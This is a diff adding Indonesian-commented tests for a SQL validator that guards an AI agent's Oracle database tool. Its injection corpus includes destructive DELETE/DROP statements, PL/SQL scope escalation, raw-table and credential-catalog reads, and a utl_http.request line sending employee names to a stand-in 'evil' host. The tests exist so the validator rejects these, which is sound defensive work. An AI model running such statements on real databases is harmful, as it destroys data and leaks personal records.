@@ -93,6 +93,70 @@ def test_validasi_select_only():
     assert not _is_safe_select("")
 
 
+# ---------------------------------------------------- korpus injeksi (C-07)
+
+# Kueri SAH yang model sungguh tulis - JOIN antar-view, CTE, aritmetika tanggal
+# lewat dual, agregat. Ini penjaga false-positive: pengetatan validator tidak
+# boleh menolak satu pun dari ini, atau agent lumpuh di kasus yang benar.
+KUERI_SAH = (
+    "SELECT nama, golongan FROM ncs.v_karyawan WHERE unit = 'Divisi Keuangan'",
+    "SELECT nomor_po FROM ncs.v_pengadaan WHERE unit = 'Divisi TI'",
+    "SELECT COUNT(*) FROM ncs.v_cuti WHERE tanggal_ajuan >= DATE '2026-07-01'",
+    "SELECT k.nama, SUM(l.jam) FROM ncs.v_lembur l "
+    "JOIN ncs.v_karyawan k ON k.nama = l.nama GROUP BY k.nama",
+    "WITH x AS (SELECT nama FROM ncs.v_karyawan) SELECT * FROM x",
+    "SELECT (tanggal_kembali - tanggal_berangkat) FROM ncs.v_sppd "
+    "WHERE nomor_sppd = 'SPPD-2026-0230'",
+)
+
+# Korpus serangan. Tiap baris HARUS ditolak validator lapis-aplikasi, sebelum
+# menyentuh basis data - meski grant DB rag_baca juga menutupnya di bawah.
+KORPUS_INJEKSI = (
+    # tulis / DDL
+    "DELETE FROM ncs.pengadaan",
+    "UPDATE ncs.v_karyawan SET golongan='Direksi'",
+    "DROP TABLE ncs.karyawan",
+    # eskalasi scope lewat PL/SQL
+    "BEGIN ncs.rag_scope.set_operator; END;",
+    "EXEC ncs.rag_scope.set_identity('NCS-0001')",
+    # banyak-pernyataan
+    "SELECT 1 FROM dual; DROP TABLE ncs.cuti",
+    "SELECT * FROM ncs.v_karyawan; DELETE FROM ncs.cuti",
+    # tabel MENTAH (bukan view) - lewati VPD kalau grant bocor
+    "SELECT * FROM ncs.karyawan",
+    "SELECT gaji FROM ncs.karyawan",
+    "SELECT * FROM ncs.v_karyawan UNION SELECT * FROM ncs.cuti",
+    # katalog / skema sistem & eksfiltrasi jaringan
+    "SELECT * FROM v$session",
+    "SELECT * FROM all_tables",
+    "SELECT * FROM dba_users",
+    "SELECT * FROM sys.user$",
+    "SELECT username FROM all_users",
+    "SELECT utl_http.request('http://evil/'||nama) FROM ncs.v_karyawan",
+)
+
+
+def test_kueri_view_sah_semua_lolos():
+    for q in KUERI_SAH:
+        assert _is_safe_select(q), f"false-positive: {q}"
+
+
+def test_korpus_injeksi_semua_ditolak():
+    for q in KORPUS_INJEKSI:
+        assert not _is_safe_select(q), f"LOLOS - seharusnya ditolak: {q}"
+
+
+def test_tabel_mentah_ditolak_tanpa_menyentuh_db():
+    """Referensi tabel mentah (bukan view) ditolak di aplikasi, dan TAK ADA SQL
+    yang sampai ke basis data - bukan hanya mengandalkan ORA-00942."""
+    inner = _FakeTool()
+    guarded = guard_db_access(inner)
+    ACTIVE_USER.set(REGISTRY[next(iter(REGISTRY))])
+    out = asyncio.run(guarded.ainvoke({"sql": "SELECT gaji FROM ncs.karyawan"}))
+    assert "DITOLAK" in out
+    assert inner.sqls == []
+
+
 # ---------------------------------------------------- reconnect + re-scope
 
 class _FlakyTool:
